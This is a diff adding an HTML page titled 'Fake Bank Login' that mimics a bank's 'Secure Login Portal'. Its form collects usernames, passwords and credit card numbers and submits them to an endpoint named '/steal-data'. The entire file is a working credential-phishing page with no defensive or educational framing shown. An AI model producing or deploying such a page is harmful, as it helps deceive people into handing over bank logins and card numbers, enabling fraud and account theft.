@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Bank Login</title>
+    <style>
+        body { font-family: sans-serif; background: #eee; text-align: center; padding-top: 50px; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        input { display: block; margin: 10px auto; padding: 10px; width: 80%; }
+        button { background: #0056b3; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Secure Login Portal</h2>
+        <form action="/steal-data" method="POST">
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="text" name="cc_number" placeholder="Credit Card Number (Optional)">
+            <button type="submit">Login Securely</button>
+        </form>
+    </div>
+</body>
+</html>
